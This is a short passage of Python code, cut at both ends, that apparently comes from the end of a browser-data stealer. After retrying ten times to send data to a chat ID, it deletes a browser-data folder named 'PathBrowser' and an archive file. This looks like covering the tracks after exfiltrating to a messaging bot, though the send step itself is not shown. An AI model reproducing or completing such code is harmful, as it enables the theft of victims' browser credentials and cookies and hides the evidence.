	if not success:print(f"Failed to send to {chat_id} after 10 attempts.")
shutil.rmtree(PathBrowser,ignore_errors=_F)
if os.path.exists(archive_path):os.remove(archive_path)
